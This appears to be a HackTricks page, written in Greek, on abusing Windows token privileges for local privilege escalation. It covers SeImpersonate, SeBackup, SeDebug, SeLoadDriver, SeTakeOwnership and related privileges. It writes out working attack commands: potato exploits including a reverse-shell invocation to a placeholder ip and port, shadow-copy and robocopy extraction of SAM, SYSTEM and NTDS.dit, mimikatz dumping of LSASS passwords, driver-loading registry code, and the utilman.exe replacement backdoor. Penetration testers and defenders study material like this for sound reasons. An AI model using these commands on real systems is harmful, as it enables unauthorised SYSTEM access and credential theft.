# Κατάχρηση Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Αν **δεν γνωρίζεις τι είναι τα Windows Access Tokens**, διάβασε αυτή τη σελίδα πριν συνεχίσεις:


{{#ref}}
access-tokens.md
{{#endref}}

**Ίσως μπορέσεις να κλιμακώσεις τα δικαιώματά σου καταχρώμενος tokens που ήδη έχεις.**

### SeImpersonatePrivilege

Αυτό το προνόμιο επιτρέπει σε μια διεργασία να υποδυθεί (αλλά όχι να δημιουργήσει) ένα token, εφόσον μπορεί να αποκτήσει ένα handle σε αυτό το token. Ένα προνομιούχο token μπορεί να αποκτηθεί από μια υπηρεσία Windows (DCOM), παρακινώντας την να πραγματοποιήσει NTLM authentication προς ένα exploit· στη συνέχεια, μπορεί να εκτελεστεί μια διεργασία με δικαιώματα SYSTEM.<sup>[[2]](#references)</sup> Αυτό το primitive μπορεί να αξιοποιηθεί με εργαλεία όπως τα [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (το οποίο απαιτεί το WinRM να είναι απενεργοποιημένο), [SweetPotato](https://github.com/CCob/SweetPotato) και [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Μια web εφαρμογή που ακούει μόνο στο loopback μπορεί να αποτελέσει ξεχωριστό στοιχείο για διερεύνηση, αν ένας τοπικός χρήστης μπορεί να προσπελάσει ένα authenticated endpoint που υποβάλλει αίτημα σε URL της επιλογής του καλούντος, υπό πιο προνομιούχα ταυτότητα. Εξέτασε τους περιορισμούς authorization και URL του endpoint, την πραγματική ταυτότητα του outbound client και τη συμπεριφορά authentication, καθώς και το αν ο client μπορεί να συνδεθεί σε listener που ελέγχει ο χρήστης με λιγότερα προνόμια. Η ενεργοποιημένη `SeImpersonatePrivilege`, ένας IIS listener ή μια παράμετρος ανάκτησης URL δεν αποδεικνύουν από μόνα τους ότι υπάρχει προνομιούχο token ή διαδρομή κλιμάκωσης δικαιωμάτων. Κράτησε αυτή την εξέταση παθητική· μην στέλνεις coercion requests κατά την απαρίθμηση. Δες την τεκμηρίωση της Microsoft για το [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) και την [ταυτότητα application pool του IIS](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Σύγχρονες σημειώσεις για operators:

- **Το JuicyPotato είναι παρωχημένο**: σε Windows 10 1809+/Server 2019+, προτίμησε **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** ή **PrintSpoofer**, ανάλογα με το ποια επιφάνεια RPC/COM είναι ακόμα προσβάσιμη.
- Αν παραβίασες μια υπηρεσία που εκτελείται ως **`LOCAL SERVICE`** ή **`NETWORK SERVICE`** και το `whoami /priv` εμφανίζει ένα **filtered token** χωρίς `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, ανάκτησε πρώτα το **default privilege set** του λογαριασμού (για παράδειγμα με το **FullPowers**) και έπειτα δοκίμασε ξανά την οικογένεια potato.<sup>[[3]](#references)</sup>
- Ορισμένα νεότερα forks είναι πιο εύχρηστα για operators από τα αρχικά εργαλεία. Για παράδειγμα, το **SigmaPotato** προσθέτει reflection/in-memory execution και συμβατότητα με σύγχρονα Windows, ενώ το **PrintNotifyPotato** καταχράται την υπηρεσία PrintNotify COM και είναι συχνά χρήσιμο όταν η κλασική διαδρομή Spooler είναι απενεργοποιημένη.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Είναι πολύ παρόμοιο με το **SeImpersonatePrivilege**: χρησιμοποιεί την **ίδια μέθοδο** για να αποκτήσει ένα προνομιούχο token.\
Στη συνέχεια, αυτό το privilege επιτρέπει **την ανάθεση ενός primary token** σε μια νέα/σε αναστολή process. Με το προνομιούχο impersonation token, μπορείτε να δημιουργήσετε ένα primary token (DuplicateTokenEx).\
Με το token, μπορείτε να δημιουργήσετε μια **νέα process** με το 'CreateProcessAsUser' ή να δημιουργήσετε μια process σε αναστολή και να **ορίσετε το token** (γενικά, δεν μπορείτε να τροποποιήσετε το primary token μιας process που εκτελείται).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Αν έχετε ενεργοποιήσει αυτό το token, μπορείτε να χρησιμοποιήσετε το **KERB_S4U_LOGON** για να αποκτήσετε ένα **impersonation token** για οποιονδήποτε άλλο χρήστη χωρίς να γνωρίζετε τα διαπιστευτήρια, να **προσθέσετε μια αυθαίρετη ομάδα** (admins) στο token, να ορίσετε το **integrity level** του token σε "**medium**" και να αναθέσετε αυτό το token στο **τρέχον thread** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Αυτό το privilege κάνει το σύστημα να **παρέχει δικαιώματα ανάγνωσης** σε οποιοδήποτε αρχείο (περιορίζεται σε λειτουργίες ανάγνωσης). Χρησιμοποιείται για **την ανάγνωση των password hashes των τοπικών λογαριασμών Administrator** από το registry. Στη συνέχεια, μπορούν να χρησιμοποιηθούν εργαλεία όπως τα "**psexec**" ή "**wmiexec**" με το hash (τεχνική Pass-the-Hash). Ωστόσο, αυτή η τεχνική αποτυγχάνει σε δύο περιπτώσεις: όταν ο λογαριασμός Local Administrator είναι απενεργοποιημένος ή όταν εφαρμόζεται πολιτική που αφαιρεί τα δικαιώματα διαχειριστή από τους Local Administrators που συνδέονται απομακρυσμένα.<sup>[[2]](#references)</sup>\
Στην πράξη, η πιο αξιόπιστη ενσωματωμένη διαδικασία είναι συνήθως **VSS + `robocopy /b`**: δημιουργήστε/εκθέστε ένα shadow copy και, στη συνέχεια, αντιγράψτε τα `SAM`/`SYSTEM` ή το `NTDS.dit` σε **backup mode**, παρακάμπτοντας έτσι τα ACLs των αρχείων.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

Μπορείτε να **καταχραστείτε αυτό το προνόμιο** με:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- ακολουθώντας τον **IppSec** στο [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ή όπως εξηγείται στην ενότητα **escalating privileges with Backup Operators** του:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Αυτό το προνόμιο παρέχει δικαίωμα **εγγραφής** σε οποιοδήποτε αρχείο συστήματος, ανεξάρτητα από τη Λίστα Ελέγχου Πρόσβασης (ACL) του αρχείου. Προσφέρει πολλές δυνατότητες για κλιμάκωση προνομίων, όπως τη δυνατότητα **τροποποίησης υπηρεσιών**, εκτέλεσης DLL Hijacking και ορισμού **debuggers** μέσω των Image File Execution Options, καθώς και διάφορων άλλων τεχνικών.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

Το SeCreateTokenPrivilege είναι ένα ισχυρό δικαίωμα, ιδιαίτερα χρήσιμο όταν ένας χρήστης έχει τη δυνατότητα να κάνει impersonation σε tokens, αλλά και όταν δεν διαθέτει SeImpersonatePrivilege. Αυτή η δυνατότητα εξαρτάται από την ικανότητα να γίνει impersonation σε ένα token που αντιπροσωπεύει τον ίδιο χρήστη και του οποίου το επίπεδο ακεραιότητας δεν υπερβαίνει εκείνο της τρέχουσας διεργασίας.<sup>[[2]](#references)</sup>

**Βασικά σημεία:**

- **Impersonation χωρίς SeImpersonatePrivilege:** Είναι δυνατό να αξιοποιηθεί το SeCreateTokenPrivilege για EoP, κάνοντας impersonation σε tokens υπό συγκεκριμένες συνθήκες.
- **Προϋποθέσεις για Token Impersonation:** Για επιτυχημένο impersonation, το token-στόχος πρέπει να ανήκει στον ίδιο χρήστη και να έχει επίπεδο ακεραιότητας μικρότερο ή ίσο με εκείνο της διεργασίας που επιχειρεί το impersonation.
- **Δημιουργία και τροποποίηση Impersonation Tokens:** Οι χρήστες μπορούν να δημιουργήσουν ένα impersonation token και να το ενισχύσουν προσθέτοντας το SID (Security Identifier) μιας προνομιούχας ομάδας.

### SeLoadDriverPrivilege

Αυτό το προνόμιο επιτρέπει σε μια διεργασία να **φορτώνει και να εκφορτώνει drivers συσκευών**, δημιουργώντας μια καταχώριση μητρώου με συγκεκριμένες τιμές `ImagePath` και `Type`. Επειδή η άμεση πρόσβαση εγγραφής στο `HKLM` (HKEY_LOCAL_MACHINE) είναι περιορισμένη, μπορεί να χρησιμοποιηθεί το `HKCU` (HKEY_CURRENT_USER). Ωστόσο, απαιτείται μια συγκεκριμένη διαδρομή, ώστε ο kernel να αναγνωρίσει την καταχώριση `HKCU` ως διαμόρφωση driver.<sup>[[2]](#references)</sup>

Η σύγχρονη επιθετική χρήση βασίζεται συνήθως στο **BYOVD** (bring your own vulnerable driver): φορτώνεται ένας **υπογεγραμμένος αλλά ευάλωτος** kernel driver και στη συνέχεια χρησιμοποιούνται τα IOCTL του για την απενεργοποίηση προστασιών ή την επίτευξη εκτέλεσης κώδικα στον kernel. Έχετε υπόψη ότι στις πρόσφατες εκδόσεις Windows 11/Server, η **Microsoft vulnerable driver blocklist** ή/και το **HVCI/Memory Integrity** συχνά εμποδίζουν παλαιότερες δημόσιες αλυσίδες εκμετάλλευσης, επομένως τα κλασικά παραδείγματα τύπου `szkg64.sys` δεν είναι πλέον αξιόπιστα σε όλες τις περιπτώσεις.

Αυτή η διαδρομή είναι `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, όπου το `<RID>` είναι το Relative Identifier του τρέχοντος χρήστη. Μέσα στο `HKCU` πρέπει να δημιουργηθεί ολόκληρη αυτή η διαδρομή και να οριστούν δύο τιμές:<sup>[[2]](#references)</sup>

- `ImagePath`, η οποία είναι η διαδρομή προς το εκτελέσιμο binary
- `Type`, με τιμή `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Βήματα:**

1. Χρησιμοποιήστε το `HKCU` αντί για το `HKLM`, λόγω της περιορισμένης πρόσβασης εγγραφής.
2. Δημιουργήστε τη διαδρομή `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` μέσα στο `HKCU`, όπου το `<RID>` αντιστοιχεί στο Relative Identifier του τρέχοντος χρήστη.
3. Ορίστε το `ImagePath` στη διαδρομή εκτέλεσης του binary.
4. Ορίστε το `Type` ως `SERVICE_KERNEL_DRIVER` (`0x00000001`).

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Περισσότεροι τρόποι κατάχρησης αυτού του προνομίου στο [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Αυτό είναι παρόμοιο με το **SeRestorePrivilege**. Η κύρια λειτουργία του επιτρέπει σε μια διεργασία να **αναλάβει την κυριότητα ενός αντικειμένου**, παρακάμπτοντας την απαίτηση για ρητή διακριτική πρόσβαση μέσω της παροχής δικαιωμάτων πρόσβασης WRITE_OWNER. Η διαδικασία περιλαμβάνει πρώτα την εξασφάλιση της κυριότητας του επιθυμητού κλειδιού μητρώου για σκοπούς εγγραφής και, στη συνέχεια, την τροποποίηση του DACL ώστε να επιτρέπονται οι λειτουργίες εγγραφής.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Αυτό το προνόμιο επιτρέπει το **debug άλλων διεργασιών**, συμπεριλαμβανομένης της ανάγνωσης και της εγγραφής στη μνήμη. Με αυτό το προνόμιο μπορούν να χρησιμοποιηθούν διάφορες στρατηγικές memory injection, οι οποίες μπορούν να παρακάμψουν τις περισσότερες λύσεις antivirus και host intrusion prevention.<sup>[[2]](#references)</sup>

Στα σύγχρονα Windows, να θυμάστε ότι το `SeDebugPrivilege` συνήθως αρκεί για να ανοίξετε **μη προστατευμένες διεργασίες SYSTEM** και να αντιγράψετε τα tokens τους, αλλά **δεν** εγγυάται ότι μπορείτε να αποκτήσετε πρόσβαση στο **LSASS**. Αν είναι ενεργοποιημένο το **RunAsPPL / LSA Protection**, οι μη προστατευμένες διεργασίες δεν μπορούν να διαβάσουν από το LSASS ή να κάνουν injection σε αυτό, ακόμη κι αν υπάρχει το `SeDebugPrivilege`. Σε αυτή την περίπτωση, κλέψτε ένα token από κάποια άλλη μη-PPL διεργασία SYSTEM ή συνδυάστε το με PPL bypass/BYOVD, αντί να θεωρήσετε δεδομένο ότι θα λειτουργήσει το `procdump`. Για ένα πλήρες παράδειγμα αντιγραφής token με χρήση των `SeDebugPrivilege` + `SeImpersonatePrivilege`, δείτε [αυτή τη σελίδα](sedebug-+-seimpersonate-copy-token.md).

#### Dump μνήμης

Μπορείτε να χρησιμοποιήσετε το [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) από το [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) για να **καταγράψετε τη μνήμη μιας διεργασίας**. Συγκεκριμένα, αυτό μπορεί να εφαρμοστεί στη διεργασία **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, η οποία είναι υπεύθυνη για την αποθήκευση των διαπιστευτηρίων των χρηστών μετά την επιτυχή σύνδεσή τους σε ένα σύστημα.

Στη συνέχεια, μπορείτε να φορτώσετε αυτό το dump στο mimikatz για να αποκτήσετε κωδικούς πρόσβασης:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Ένα previously saved, αναγνώσιμο LSASS dump ενδέχεται να είναι διαθέσιμο, ακόμη κι αν ο τρέχων λογαριασμός δεν έχει δικαίωμα να καταγράψει τη ζωντανή προστατευμένη διεργασία. Αντιμετωπίστε ένα dump file ή ένα αρχείο με παρόμοιο όνομα μόνο ως ένδειξη: επαληθεύστε την πρόσβαση και τα περιεχόμενά του και, στη συνέχεια, αξιολογήστε αν τυχόν ανακτημένα credentials εξακολουθούν να είναι έγκυρα και παρέχουν πρόσβαση σε περιβάλλον με υψηλότερα προνόμια. Τα ονόματα αρχείων από μόνα τους δεν αποδεικνύουν ότι ένα αρχείο περιέχει dump ή ότι τα credentials μπορούν να χρησιμοποιηθούν ξανά.

#### RCE

Αν θέλετε να αποκτήσετε ένα `NT SYSTEM` shell, μπορείτε να χρησιμοποιήσετε:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Αυτό το δικαίωμα (Εκτέλεση εργασιών συντήρησης τόμων) μπορεί να επιτρέψει προνομιούχες λειτουργίες τόμων, αλλά από μόνο του δεν εγγυάται πρόσβαση σε raw-volume handle με δυνατότητα ανάγνωσης ή αυθαίρετη πρόσβαση σε αρχεία. Εξακολουθούν να έχουν σημασία τα ACL συσκευών, η κατάσταση του token, η έκδοση των Windows και η ζητούμενη λειτουργία. Μια επιτρεπόμενη λειτουργία ελέγχου τόμου μπορεί, αντίθετα, να αλλάξει τα ACL του filesystem· πρόκειται για τροποποιητική ενέργεια που ενδέχεται να επηρεάσει ολόκληρο τον τόμο. Σε έναν CA host, η κατάχρηση πιστοποιητικών απαιτεί επίσης πρόσβαση σε αξιοποιήσιμο υλικό ιδιωτικού κλειδιού, ενώ για αρχεία που προστατεύονται από EFS εξακολουθεί να απαιτείται εξουσιοδοτημένο κλειδί αποκρυπτογράφησης ή ανάκτησης. Δείτε παρακάτω τις αναλυτικές προϋποθέσεις.<sup>[[5]](#references)</sup>

Δείτε αναλυτικές τεχνικές και μετριασμούς:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Έλεγχος δικαιωμάτων

```
whoami /priv
```

Τα **tokens που εμφανίζονται ως Disabled** μπορούν συνήθως να ενεργοποιηθούν, επομένως συχνά μπορείτε να κάνετε κατάχρηση τόσο των προνομίων _Enabled_ όσο και των _Disabled_.

### Ενεργοποίηση όλων των tokens

Αν έχετε απενεργοποιημένα προνόμια, μπορείτε να χρησιμοποιήσετε το script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) για να ενεργοποιήσετε όλα τα tokens:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Ή το **script** που είναι ενσωματωμένο σε αυτήν την [**ανάρτηση**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Πίνακας

Πλήρης συνοπτικός οδηγός για τα token privileges στο [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin). Η παρακάτω σύνοψη αναφέρει μόνο άμεσους τρόπους εκμετάλλευσης του privilege για την απόκτηση admin session ή την ανάγνωση ευαίσθητων αρχείων.<sup>[[1]](#references)</sup>

| Privilege                  | Επίδραση      | Εργαλείο                    | Διαδρομή εκτέλεσης                                                                                                                                                                                                                                                                                                                                     | Παρατηρήσεις                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | εργαλείο τρίτου μέρους          | _"Θα επέτρεπε σε έναν χρήστη να κάνει impersonate tokens και να κάνει privesc σε nt system χρησιμοποιώντας εργαλεία όπως τα potato.exe, rottenpotato.exe και juicypotato.exe"_                                                                                                                                                                                                      | Ευχαριστώ τον [Aurélien Chalot](https://twitter.com/Defte_) για την ενημέρωση. Θα προσπαθήσω σύντομα να το διατυπώσω ξανά με πιο πρακτικό τρόπο.                                                                                                                                                                                         |
| **`SeBackup`**             | **Απειλή**  | _**Ενσωματωμένες εντολές**_ | Ανάγνωση ευαίσθητων αρχείων με `robocopy /b` ή ειδικά βοηθητικά εργαλεία αντιγραφής που υποστηρίζουν SeBackup.                                                                                                                                                                                                                                                                 | <p>- Ιδανικό για `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` και μερικές φορές το `%WINDIR%\MEMORY.DMP`.<br><br>- Το `robocopy` είναι πρακτικό, αλλά τα ειδικά SeBackup cmdlets/APIs είναι συχνά πιο ευέλικτα για κλειδωμένα/ανοιχτά αρχεία.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | εργαλείο τρίτου μέρους          | Δημιουργία αυθαίρετου token, συμπεριλαμβανομένων τοπικών δικαιωμάτων admin, με το `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Αντιγραφή ενός token SYSTEM που δεν είναι **PPL** ή λήψη dump μνήμης από διεργασία που δεν προστατεύεται.                                                                                                                                                                                                                                                                 | <p>Η λήψη dump του LSASS συνήθως αποκλείεται όταν είναι ενεργοποιημένο το RunAsPPL/LSA Protection.</p><p>Το script βρίσκεται στο [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | εργαλείο τρίτου μέρους          | Χρήση της **οικογένειας Potato** / impersonation μέσω named pipe για την εκκίνηση του SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` κ.λπ.).                                                                                                                                                                                    | <p>Πιο πρακτικό από λογαριασμούς υπηρεσιών όπως IIS APPPOOL, MSSQL, προγραμματισμένες εργασίες ή οποιοδήποτε context διαθέτει ήδη το `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | εργαλείο τρίτου μέρους          | <p>1. Φόρτωση υπογεγραμμένου αλλά ευάλωτου kernel driver (BYOVD)<br>2. Χρήση των IOCTL του driver για απόκτηση kernel R/W, απενεργοποίηση εργαλείων ασφαλείας ή κλιμάκωση σε SYSTEM<br><br>Εναλλακτικά, το privilege μπορεί να χρησιμοποιηθεί για την εκφόρτωση drivers που σχετίζονται με την ασφάλεια με την ενσωματωμένη εντολή <code>fltMC</code>, π.χ. <code>fltMC sysmondrv</code></p>                     | <p>Οι παλαιότεροι δημόσια διαθέσιμοι drivers όπως ο <code>szkg64.sys</code> αποκλείονται όλο και συχνότερα στα σύγχρονα Windows από τη λίστα αποκλεισμού ευάλωτων drivers / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Εκκίνηση του PowerShell/ISE με ενεργό το SeRestore privilege.<br>2. Ενεργοποίηση του privilege με το <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Μετονομασία του utilman.exe σε utilman.old<br>4. Μετονομασία του cmd.exe σε utilman.exe<br>5. Κλείδωμα της κονσόλας και πάτημα Win+U</p> | <p>Η επίθεση μπορεί να εντοπιστεί από ορισμένα προγράμματα AV.</p><p>Μια εναλλακτική μέθοδος βασίζεται στην αντικατάσταση των εκτελέσιμων αρχείων υπηρεσιών που βρίσκονται στο "Program Files" με το ίδιο privilege.</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Ενσωματωμένες εντολές**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Μετονομασία του cmd.exe σε utilman.exe<br>4. Κλείδωμα της κονσόλας και πάτημα Win+U</p>                                                                                                                                       | <p>Η επίθεση μπορεί να εντοπιστεί από ορισμένα προγράμματα AV.</p><p>Μια εναλλακτική μέθοδος βασίζεται στην αντικατάσταση των εκτελέσιμων αρχείων υπηρεσιών που βρίσκονται στο "Program Files" με το ίδιο privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | εργαλείο τρίτου μέρους          | <p>Τροποποίηση των tokens ώστε να περιλαμβάνουν τοπικά δικαιώματα admin. Ενδέχεται να απαιτείται SeImpersonate.</p><p>Προς επαλήθευση.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - διαδρομές εκμετάλλευσης από Windows privileges σε admin](https://github.com/gtworek/Priv2Admin)
- [2] [Κατάχρηση Token Privileges για LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Δώστε μου πίσω τα Privileges μου! Παρακαλώ;](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (η λειτουργία αντιγράφων ασφαλείας `/b` παρακάμπτει τους ελέγχους ACL αρχείων/φακέλων)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Εκτέλεση εργασιών συντήρησης τόμου (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → εξαγωγή κλειδιού CA → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
